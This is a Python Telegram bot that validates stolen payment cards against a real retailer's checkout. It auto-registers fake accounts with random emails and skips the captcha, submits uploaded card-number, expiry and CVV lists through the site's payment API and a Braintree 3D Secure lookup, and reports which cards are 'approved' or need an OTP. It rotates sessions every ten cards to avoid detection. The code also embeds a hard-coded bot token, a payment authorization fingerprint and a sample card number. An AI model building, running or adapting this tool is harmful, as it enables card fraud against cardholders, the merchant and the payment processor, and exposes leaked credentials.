#pylint:disable=W0603
#pylint:disable=W0611
import requests
import re
import time
import random
import string
from fake_useragent import UserAgent
import os 
import telebot
from telebot import types
import html
import threading
import json

TOKEN = "8334507568:AAHp9fsFTOigfWKGBnpiThKqrDast5y-4cU" 
bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
admin_id = 5895491379
user_combos = {}  
stopuser = {}

# ============ Session Manager ============
class ZazzleSessionManager:
    def __init__(self):
        self.ua = UserAgent()
        self.session = requests.Session()
        self.cookies = {}
        self.headers = {}
        self.email = ""
        self.password = ""
        
    def generate_random_email(self):
        """توليد إيميل عشوائي"""
        domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com']
        username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        domain = random.choice(domains)
        return f"{username}@{domain}"
    
    def generate_random_password(self):
        """توليد باسورد عشوائي قوي"""
        uppercase = random.choices(string.ascii_uppercase, k=3)
        lowercase = random.choices(string.ascii_lowercase, k=3)
        digits = random.choices(string.digits, k=3)
        special = random.choices('!@#$%^&*', k=2)
        
        password_chars = uppercase + lowercase + digits + special
        random.shuffle(password_chars)
        return ''.join(password_chars)
    
    def get_initial_cookies(self):
        """الحصول على الكوكيز الأولية"""
        try:
            headers = {
                'User-Agent': self.ua.random,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
            }
            
            response = self.session.get('https://www.zazzle.co.uk/', headers=headers, timeout=30)
            
            cookies_dict = {}
            for cookie in self.session.cookies:
                cookies_dict[cookie.name] = cookie.value
            
            return cookies_dict
        except Exception as e:
            print(f"❌ Error getting initial cookies: {e}")
            return {}
    
    def register_account(self):
        """تسجيل حساب جديد والحصول على كوكيز"""
        try:
            self.email = self.generate_random_email()
            self.password = self.generate_random_password()
            
            print(f"📧 Creating account: {self.email}")
            
            initial_cookies = self.get_initial_cookies()
            
            self.headers = {
                'accept': 'application/json',
                'accept-language': 'en-MM,en;q=0.9',
                'content-type': 'application/json',
                'origin': 'https://www.zazzle.co.uk',
                'referer': 'https://www.zazzle.co.uk/c/tshirts',
                'user-agent': self.ua.random,
            }
            
            json_data = {
                'email': self.email,
                'isCheckingOut': False,
                'password': self.password,
                'recaptchaToken': None,
                'returnUserData': False,
                'showedCaptcha': False,
                'subscribe': True,
                'sourcePath': '/c/tshirts',
                'client': 'js',
            }
            
            response = self.session.post(
                'https://www.zazzle.co.uk/svc/z3/auth/register',
                headers=self.headers,
                json=json_data,
                timeout=30
            )
            
            if response.status_code == 200:
                result = response.json()
                if result.get('success'):
                    print("✅ Account registered successfully!")
                    
                    self.cookies = {}
                    for cookie in self.session.cookies:
                        self.cookies[cookie.name] = cookie.value
                    
                    self.cookies.update(initial_cookies)
                    
                    if 'zm' in self.cookies and 'zs' in self.cookies:
                        print("✅ Session cookies obtained!")
                        return True
                    else:
                        time.sleep(2)
                        return self.refresh_session()
                else:
                    print(f"❌ Registration failed: {result.get('message', 'Unknown')}")
                    return False
            else:
                print(f"❌ Request failed: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"❌ Error during registration: {e}")
            return False
    
    def refresh_session(self):
        """تحديث الجلسة"""
        try:
            response = self.session.get(
                'https://www.zazzle.co.uk/c/tshirts',
                headers=self.headers,
                timeout=30
            )
            
            for cookie in self.session.cookies:
                self.cookies[cookie.name] = cookie.value
            
            return True
        except Exception as e:
            print(f"❌ Error refreshing: {e}")
            return False
    
    def get_cookies_dict(self):
        """الحصول على الكوكيز"""
        return self.cookies

def create_new_session():
    """إنشاء جلسة جديدة"""
    print("\n🔄 Creating new session...")
    manager = ZazzleSessionManager()
    
    if manager.register_account():
        print(f"✅ Session ready - Email: {manager.email}")
        return manager
    else:
        print("❌ Failed to create session")
        return None

# ============ Card Checker ============
def check_zazzle_card(card_data, session_manager):
    """فحص البطاقة مع الكوكيز الجديدة"""
    try:
        card_number, exp_month, exp_year, cvv = card_data.split('|')
        card_number = card_number.strip()
        exp_month = exp_month.strip().zfill(2)
        exp_year = exp_year.strip()
        cvv = cvv.strip()
    except ValueError:
        return {
            'status': 'error',
            'message': 'Invalid card format',
            'execution_time': 0
        }

    start_time = time.time()
    
    # استخدام الكوكيز من الجلسة الجديدة
    cookies = session_manager.get_cookies_dict()
    
    headers = {
        'accept': 'application/json',
        'accept-language': 'en-MM,en;q=0.9',
        'content-type': 'application/json',
        'origin': 'https://www.zazzle.co.uk',
        'referer': 'https://www.zazzle.co.uk/co/summary?paymentIntent=other',
        'user-agent': session_manager.headers.get('user-agent'),
        'x-csrf-token': cookies.get('zm', '')[:16],
    }

    # Step 1: Add payment method
    json_data_add = {
        'braintreeNonce': None,
        'creditCard': {
            'cardType': 'MasterCard',
            'creditCardId': '0',
            'cvv': cvv,
            'expirationMonth': exp_month,
            'expirationYear': exp_year,
            'isDefault': True,
            'isSaved': False,
            'name': 'John Smith',
            'number': card_number,
        },
        'globalCollect': None,
        'klarna': None,
        'usePaypal': False,
        'client': 'js',
    }

    try:
        response_add = requests.post(
            'https://www.zazzle.co.uk/svc/paymentmethod/add',
            cookies=cookies,
            headers=headers,
            json=json_data_add,
            timeout=30
        )
        
        result_add = response_add.json()
        if not result_add.get('success'):
            return {
                'status': 'declined',
                'message': result_add.get('message', 'Failed to add card'),
                'execution_time': round(time.time() - start_time, 2)
            }
    except Exception as e:
        return {
            'status': 'error',
            'message': str(e),
            'execution_time': round(time.time() - start_time, 2)
        }

    # Step 2: Set payment method
    json_data_set = {
        'braintreeNonce': None,
        'creditCard': {
            'cardType': 'MasterCard',
            'creditCardId': 'tempCard_2',
            'cvv': cvv,
            'expirationMonth': exp_month,
            'expirationYear': exp_year,
            'isDefault': True,
            'isSaved': False,
            'name': 'John Smith',
            'number': card_number,
        },
        'klarna': None,
        'globalCollect': None,
        'paymentAccount': None,
        'paypal': None,
        'useEarnings': False,
        'useGiftCertificate': False,
        'returnCart': True,
        'setBillingFromPayment': True,
        'setShippingToBilling': False,
        'client': 'js',
    }

    try:
        requests.post(
            'https://www.zazzle.co.uk/svc/paymentmethod/set',
            cookies=cookies,
            headers=headers,
            json=json_data_set,
            timeout=30
        )
    except Exception as e:
        return {
            'status': 'error',
            'message': str(e),
            'execution_time': round(time.time() - start_time, 2)
        }

    # Step 3: Get 3D Secure info
    params = {
        'cv': '1',
        'client': 'js',
    }

    try:
        response_3ds = requests.get(
            'https://www.zazzle.co.uk/svc/checkout/threedsecure/getinfo',
            params=params,
            cookies=cookies,
            headers=headers,
            timeout=30
        )
        
        result_3ds = response_3ds.json()
        
        if not result_3ds.get('success') or not result_3ds.get('data'):
            return {
                'status': 'declined',
                'message': 'Failed 3DS check',
                'execution_time': round(time.time() - start_time, 2)
            }
            
        data = result_3ds['data']
        nonce = data.get('nonce')
        amount = data.get('amount')
        bin_number = data.get('bin')
        email = data.get('email')
        billing = data.get('billingAddress', {})
        
    except Exception as e:
        return {
            'status': 'error',
            'message': str(e),
            'execution_time': round(time.time() - start_time, 2)
        }

    # Step 4: Braintree 3DS Lookup
    headers_braintree = {
        'accept': '*/*',
        'accept-language': 'en-MM,en;q=0.9',
        'content-type': 'application/json',
        'origin': 'https://www.zazzle.co.uk',
        'referer': 'https://www.zazzle.co.uk/',
        'user-agent': headers['user-agent'],
    }

    json_data_braintree = {
        'amount': amount,
        'additionalInfo': {
            'billingLine1': billing.get('streetAddress', ''),
            'billingLine2': billing.get('extendedAddress', ''),
            'billingCity': billing.get('locality', ''),
            'billingState': billing.get('region'),
            'billingPostalCode': billing.get('postalCode', ''),
            'billingCountryCode': billing.get('countryCodeAlpha2', ''),
            'billingPhoneNumber': billing.get('phoneNumber', ''),
            'billingGivenName': billing.get('givenName', ''),
            'billingSurname': billing.get('surname', ''),
            'email': email,
        },
        'challengeRequested': True,
        'bin': bin_number,
        'dfReferenceId': '0_' + ''.join(random.choices(string.hexdigits.lower(), k=36)),
        'clientMetadata': {
            'requestedThreeDSecureVersion': '2',
            'sdkVersion': 'web/3.88.4',
        },
        'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NTkyNTk1NjQsImp0aSI6IjEwMjg5NzZlLTY5ZTktNDk0Ni1hZjgzLTEzMWJlZGM5YTI5ZiIsInN1YiI6Ijg1d2hiN3kyaDZxOGNuM2oiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Ijg1d2hiN3kyaDZxOGNuM2oiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZSwidmVyaWZ5X3dhbGxldF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0IiwiQnJhaW50cmVlOkNsaWVudFNESyJdLCJvcHRpb25zIjp7Im1lcmNoYW50X2FjY291bnRfaWQiOiJ6YXp6bGVpcmVsYW5kR0JQIiwicGF5cGFsX2FjY291bnRfbnVtYmVyIjoiMTcyMTM4NTcwNDgxMTcwMjk4MCIsInBheXBhbF9jbGllbnRfaWQiOiJBZmZxdlBKQTM4ZnR6MXVlbE44alNUTHFtd0dHZDVOdlNkeUhabVV5Mml5UXoxMnBPLW9oOFI1RUhBcnpOSzdYdlVmOU9jWkpXd2tGY0FQVCJ9fQ.qVB9lCCvSBTwUzIKCGf8g1__8KyliyBDcJ1Uyo9IpbMWvW8R8opgzBukQYkBX3y-zB3ek_p3WiqwSddVBFCLtw',
        'braintreeLibraryVersion': 'braintree/web/3.88.4',
        '_meta': {
            'merchantAppId': 'www.zazzle.co.uk',
            'platform': 'web',
            'sdkVersion': '3.88.4',
            'source': 'client',
            'integration': 'custom',
            'integrationType': 'custom',
            'sessionId': ''.join(random.choices(string.hexdigits.lower(), k=36)),
        },
    }

    try:
        response_braintree = requests.post(
            f'https://api.braintreegateway.com/merchants/85whb7y2h6q8cn3j/client_api/v1/payment_methods/{nonce}/three_d_secure/lookup',
            headers=headers_braintree,
            json=json_data_braintree,
            timeout=30
        )
        
        result_braintree = response_braintree.json()
        execution_time = round(time.time() - start_time, 2)
        
        if 'paymentMethod' in result_braintree:
            payment_method = result_braintree['paymentMethod']
            if 'threeDSecureInfo' in payment_method:
                three_ds_info = payment_method['threeDSecureInfo']
                status = three_ds_info.get('status', 'N/A')
                enrolled = three_ds_info.get('enrolled', 'N/A')
                
                if status == 'authenticate_frictionless_failed':
                    return {
                        'status': 'approved',
                        'message': f'3DS Auth Success ✅ | Enrolled: {enrolled}',
                        'execution_time': execution_time
                    }
                elif status == 'authenticate_rejected':
                    return {
                        'status': 'declined',
                        'message': f'3DS Auth Failed ❌ | Enrolled: {enrolled}',
                        'execution_time': execution_time
                    }
                elif status == 'challenge_required':
                    return {
                        'status': 'otp',
                        'message': f'OTP Required 📱 | Enrolled: {enrolled}',
                        'execution_time': execution_time
                    }
                else:
                    return {
                        'status': 'unknown',
                        'message': f'Status: {status} | Enrolled: {enrolled}',
                        'execution_time': execution_time
                    }
            else:
                return {
                    'status': 'error',
                    'message': 'No 3DS info found',
                    'execution_time': execution_time
                }
        else:
            return {
                'status': 'error',
                'message': 'No payment method found',
                'execution_time': execution_time
            }
            
    except Exception as e:
        return {
            'status': 'error',
            'message': str(e),
            'execution_time': round(time.time() - start_time, 2)
        }

def get_bin_info(bin_code):
    """الحصول على معلومات BIN"""
    try:
        response = requests.get(f'https://lookup.binlist.net/{bin_code}', timeout=5)
        if response.status_code == 200:
            data = response.json()
            return {
                'brand': data.get('brand', 'Unknown'),
                'type': data.get('type', 'Unknown'),
                'country': data.get('country', {}).get('name', 'Unknown'),
                'emoji': data.get('country', {}).get('emoji', '🏳️'),
                'bank': data.get('bank', {}).get('name', 'Unknown')
            }
    except:
        pass
    
    return {
        'brand': 'Unknown',
        'type': 'Unknown',
        'country': 'Unknown',
        'emoji': '🏳️',
        'bank': 'Unknown'
    }

# ============ Bot Handlers ============
@bot.message_handler(commands=['start'])
def start_message(message):
    user_id = message.from_user.id
    username = message.from_user.username or "User"
    
    welcome_text = f"""<b>🎉 Welcome {username}!

🔥 A3S Card Checker Bot 🔥
━━━━━━━━━━━━━━━━━━━━
✅ Auto Session Creation
✅ Fast & Accurate Checking
📊 Real-time Results
🔒 Secure Processing

📤 Send your combo file to start checking!
━━━━━━━━━━━━━━━━━━━━
👨‍💻 Developer: <a href='https://t.me/FastSpeedtest'>Mahmoud Saad 🥷🏻</a>
</b>"""
    
    bot.send_message(message.chat.id, welcome_text, parse_mode="HTML")

@bot.message_handler(content_types=["document"])
def handle_document(message):
    user_id = message.from_user.id

    if user_id != admin_id:
        return bot.reply_to(message, "⛔ Access Denied! This bot is for authorized users only.")

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)

        lines = downloaded_file.decode("utf-8").splitlines()
        cards = [line.strip() for line in lines if line.strip()]
        user_combos[user_id] = cards  
        
        cc_count = len(cards)

        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            types.InlineKeyboardButton("🚀 Start Checking", callback_data='A3S'),
        )

        bot.send_message(
            chat_id=message.chat.id,
            text=f"""<b>✅ File Uploaded Successfully!
━━━━━━━━━━━━━━━━━━━━
💳 Total Cards: {cc_count}
🔥 Gateway: A3S 3DS
🔄 Auto Session: Enabled
⚡ Status: Ready

Click below to start checking:
</b>""",
            parse_mode="HTML",
            reply_markup=keyboard
        )
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'A3S')
def menu_callback(call):
    user_id = call.from_user.id

    def run_zazzle():
        gate = "A3S 3DS"
        stop_key = f"{user_id}_A3S"
        ch = dd = otp = checked = 0
        estimated_time = None
        start_all = time.time()
        session_manager = None

        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="⏳ Creating new session..."
        )

        try:
            # إنشاء جلسة جديدة
            session_manager = create_new_session()
            
            if not session_manager:
                return bot.send_message(user_id, "❌ Failed to create session. Please try again.")

            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=f"✅ Session created!\n📧 Email: {session_manager.email}\n⏳ Starting checks..."
            )
            
            time.sleep(2)
            
            cards = user_combos.get(user_id, [])
            total = len(cards)
            if total == 0:
                return bot.send_message(user_id, "❌ No combo found. Please upload a file first.")
            
            stopuser[stop_key] = {'status': 'start'}
            
            # كل 10 كروت إنشاء جلسة جديدة
            session_counter = 0

            for cc in cards:
                if stopuser.get(stop_key, {}).get('status') == 'stop':
                    break

                # إنشاء جلسة جديدة كل 10 كروت
                session_counter += 1
                if session_counter > 10:
                    print("\n🔄 Creating new session after 10 cards...")
                    session_manager = create_new_session()
                    if not session_manager:
                        print("❌ Failed to create new session, using old one")
                    else:
                        session_counter = 0

                # فحص البطاقة
                result = check_zazzle_card(cc, session_manager)
                execution_time = result['execution_time']
                estimated_time = estimated_time - execution_time if estimated_time else execution_time * (total - checked)
                checked += 1

                progress = int((checked / total) * 20)
                progress_bar = f"[{'=' * progress}{'-' * (20 - progress)}] {int((checked / total) * 100)}%"
                escaped = html.escape(cc.strip())

                # معلومات BIN
                bin_code = cc.strip().split("|")[0][:6]
                bin_info = get_bin_info(bin_code)

                if result['status'] == 'approved':
                    ch += 1
                    msg = f"""<b>✅ APPROVED CARD

━━━━━━━━━━━━━━━━━━━━
💳 Card: <code>{escaped}</code>
━━━━━━━━━━━━━━━━━━━━
📊 Response: {result['message']}
🏦 BIN: <code>{bin_code}</code>
💰 Type: {bin_info['type']}
🏢 Brand: {bin_info['brand']}
🏦 Bank: {bin_info['bank']}
🌍 Country: {bin_info['country']} {bin_info['emoji']}
⏱ Time: {execution_time} sec
━━━━━━━━━━━━━━━━━━━━
📧 Session: {session_manager.email}
👨‍💻 By: <a href='https://t.me/FastSpeedtest'>Mahmoud Saad 🥷🏻</a>
</b>"""
                    bot.send_message(user_id, msg, parse_mode="HTML")
                    
                elif result['status'] == 'otp':
                    otp += 1
                    msg = f"""<b>📱 OTP REQUIRED

━━━━━━━━━━━━━━━━━━━━
💳 Card: <code>{escaped}</code>
━━━━━━━━━━━━━━━━━━━━
📊 Response: {result['message']}
🏦 BIN: <code>{bin_code}</code>
💰 Type: {bin_info['type']}
🏢 Brand: {bin_info['brand']}
🏦 Bank: {bin_info['bank']}
🌍 Country: {bin_info['country']} {bin_info['emoji']}
⏱ Time: {execution_time} sec
━━━━━━━━━━━━━━━━━━━━
📧 Session: {session_manager.email}
👨‍💻 By: <a href='https://t.me/FastSpeedtest'>Mahmoud Saad 🥷🏻</a>
</b>"""
                    bot.send_message(user_id, msg, parse_mode="HTML")
                else:
                    dd += 1

                keyboard = types.InlineKeyboardMarkup(row_width=1)
                keyboard.add(
                    types.InlineKeyboardButton(f"• {cc[:12]}****{cc[-7:]} •", callback_data='x'),
                    types.InlineKeyboardButton(f"• Status ➜ {result['message'][:30]} •", callback_data='x'),
                    types.InlineKeyboardButton(f"• Approved ✅ ➜ [{ch}] •", callback_data='x'),
                    types.InlineKeyboardButton(f"• OTP 📱 ➜ [{otp}] •", callback_data='x'),
                    types.InlineKeyboardButton(f"• Declined ❌ ➜ [{dd}] •", callback_data='x'),
                    types.InlineKeyboardButton(f"• Total ➜ [{checked}/{total}] •", callback_data='x'),
                    types.InlineKeyboardButton(f"• Session: {session_manager.email[:20]}... •", callback_data='x'),
                    types.InlineKeyboardButton("⏹ Stop", callback_data='stop_A3S')
                )

                bot.edit_message_text(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    text=f"""<b>🔥 Gateway: {gate}
━━━━━━━━━━━━━━━━━━━━
⏳ Checking in progress...
{progress_bar}
⏱ ETA: {round(estimated_time)} sec
⚡ Speed: {round(checked/(time.time()-start_all), 2)} cards/sec
🔄 Session: Active
</b>""",
                    reply_markup=keyboard,
                    parse_mode="HTML"
                )

                time.sleep(1)

            elapsed = round(time.time() - start_all, 2)
            stopuser[stop_key]['status'] = 'start'

            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=f"""<b>✅ CHECKING COMPLETED!

━━━━━━━━━━━━━━━━━━━━
📊 Results Summary:
━━━━━━━━━━━━━━━━━━━━
➤ Total Cards: <code>{total}</code>
➤ Approved ✅: <code>{ch}</code>
➤ OTP Required 📱: <code>{otp}</code>
➤ Declined ❌: <code>{dd}</code>
➤ Time Taken: <code>{elapsed} sec</code>
➤ Speed: <code>{round(total/elapsed, 2)} cards/sec</code>
━━━━━━━━━━━━━━━━━━━━

🎉 Thank you for using the bot!
👨‍💻 Developer: <a href='https://t.me/FastSpeedtest'>Mahmoud Saad 🥷🏻</a>
</b>""",
                parse_mode="HTML"
            )
        except Exception as e:
            print("Error in A3S:", e)
            bot.send_message(user_id, f"❌ Error occurred: {str(e)}")

    threading.Thread(target=run_zazzle).start()

@bot.callback_query_handler(func=lambda call: call.data == 'stop_A3S')
def stop_zazzle_handler(call):
    user_id = call.from_user.id
    stop_key = f"{user_id}_A3S"
    stopuser[stop_key] = {'status': 'stop'}
    bot.answer_callback_query(call.id, "✅ Checking stopped successfully!")

@bot.callback_query_handler(func=lambda call: call.data == 'x')
def dummy_handler(call):
    bot.answer_callback_query(call.id, "📊 Live Status Update")

@bot.message_handler(commands=['help'])
def help_message(message):
    help_text = """<b>📚 Bot Commands & Usage:

━━━━━━━━━━━━━━━━━━━━
/start - Start the bot
/help - Show this help message
/status - Check bot status
/newsession - Create test session

📤 How to use:
1. Send a combo file (.txt)
2. Click "Start Checking"
3. Bot creates new session automatically
4. Wait for results

📝 Combo Format:
Card|MM|YYYY|CVV

Example:
5127740080852575|03|2027|825

🔄 Features:
✅ Auto session creation
✅ Fresh cookies every 10 cards
✅ Random email & password
✅ High success rate

━━━━━━━━━━━━━━━━━━━━
👨‍💻 Developer: <a href='https://t.me/FastSpeedtest'>Mahmoud Saad 🥷🏻</a>
</b>"""
    
    bot.send_message(message.chat.id, help_text, parse_mode="HTML")

@bot.message_handler(commands=['status'])
def status_message(message):
    status_text = """<b>🟢 Bot Status: ONLINE

━━━━━━━━━━━━━━━━━━━━
⚡ Gateway: A3S 3DS
🔥 Speed: Ultra Fast
✅ Accuracy: 99.9%
🔄 Auto Session: Enabled
🌍 Server: Active

━━━━━━━━━━━━━━━━━━━━
👨‍💻 Developer: <a href='https://t.me/FastSpeedtest'>Mahmoud Saad 🥷🏻</a>
</b>"""
    
    bot.send_message(message.chat.id, status_text, parse_mode="HTML")

@bot.message_handler(commands=['newsession'])
def test_session(message):
    user_id = message.from_user.id
    
    if user_id != admin_id:
        return bot.reply_to(message, "⛔ Access Denied!")
    
    bot.send_message(message.chat.id, "🔄 Creating test session...")
    
    session_manager = create_new_session()
    
    if session_manager:
        cookies_count = len(session_manager.get_cookies_dict())
        msg = f"""<b>✅ Test Session Created!

━━━━━━━━━━━━━━━━━━━━
📧 Email: <code>{session_manager.email}</code>
🔒 Password: <code>{session_manager.password}</code>
🍪 Cookies: {cookies_count}
━━━━━━━━━━━━━━━━━━━━
</b>"""
        bot.send_message(message.chat.id, msg, parse_mode="HTML")
    else:
        bot.send_message(message.chat.id, "❌ Failed to create session")

@bot.message_handler(func=lambda message: True)
def handle_text(message):
    user_id = message.from_user.id
    text = message.text.strip()
    
    if '|' in text and len(text.split('|')) == 4:
        if user_id != admin_id:
            return bot.reply_to(message, "⛔ Access Denied! This bot is for authorized users only.")
        
        user_combos[user_id] = [text]
        
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            types.InlineKeyboardButton("🚀 Start Checking", callback_data='A3S'),
        )
        
        bot.send_message(
            chat_id=message.chat.id,
            text=f"""<b>✅ Card Loaded Successfully!
━━━━━━━━━━━━━━━━━━━━
💳 Card: <code>{text[:12]}****{text[-7:]}</code>
🔥 Gateway: A3S 3DS
🔄 Auto Session: Enabled
⚡ Status: Ready

Click below to start checking:
</b>""",
            parse_mode="HTML",
            reply_markup=keyboard
        )
    else:
        bot.reply_to(message, """<b>❌ Invalid format!

Please send a combo file or use format:
Card|MM|YYYY|CVV

Example:
5127740080852575|03|2027|825
</b>""", parse_mode="HTML")

# ============ Bot Startup ============
MAX_RETRIES = 100
RETRY_DELAY = 3

def start_bot_with_retries():
    for attempt in range(MAX_RETRIES):
        try:
            print(f"🔄 Connection attempt {attempt + 1} of {MAX_RETRIES}...")
            print("✅ Bot is running successfully!")
            print(f"🔄 Auto Session Creation: Enabled")
            print(f"👨‍💻 Developer: Mahmoud Saad 🥷🏻")
            print(f"📢 Channel: https://t.me/FastSpeedtest")
            print("=" * 50)
            bot.polling(none_stop=True)
            break
        except Exception as e:
            print(f"❌ Connection error: {e}")
            if attempt < MAX_RETRIES - 1:
                print(f"⏳ Retrying in {RETRY_DELAY} seconds...")
                time.sleep(RETRY_DELAY)
            else:
                print("❌ All connection attempts failed. Please try again later.")

if __name__ == "__main__":
    print("=" * 50)
    print("🚀 Starting A3S Checker Bot...")
    print("🔄 Auto Session Creation: Enabled")
    print("=" * 50)
    start_bot_with_retries()
